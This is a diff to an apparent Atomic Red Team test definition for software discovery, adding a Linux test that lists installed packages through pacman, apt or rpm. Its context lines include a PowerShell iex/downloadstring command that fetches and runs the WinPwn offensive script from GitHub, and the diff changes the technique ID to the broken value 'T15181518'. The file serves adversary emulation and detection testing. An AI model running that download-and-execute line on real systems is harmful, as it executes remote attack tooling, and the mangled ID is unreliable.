@@ -1,4 +1,4 @@
-attack_technique: T1518
+attack_technique: T15181518
 display_name: Software Discovery
 atomic_tests:
 - name: Find and Display Internet Explorer Browser Version
@@ -71,3 +71,26 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       powerSQL -noninteractive -consoleoutput
     name: powershell
+
+- name: Linux - Software Discovery with Package Managers
+  auto_generated_guid: 6a90399d-bcf8-406e-bbce-aa49ce1fccbc
+  description: |
+    Enumerates installed software using the available package manager (rpm, apt, or pacman) on the system.
+  supported_platforms:
+    - linux
+  dependencies:
+    - description: |
+        Checks for the existence of rpm, apt, or pacman and uses whichever is found. Requires at least one to be installed.
+      prereq_command: |
+        (type rpm || type apt || type pacman) &>/dev/null
+      get_prereq_command: |
+        echo "Ensure rpm, apt, or pacman is installed on your system."
+  dependency_executor_name: sh
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      ((which pacman >/dev/null) && pacman -Q) || :
+      ((which apt >/dev/null) && apt list --installed) || :
+      ((which rpm >/dev/null) && rpm -qa) || :
+
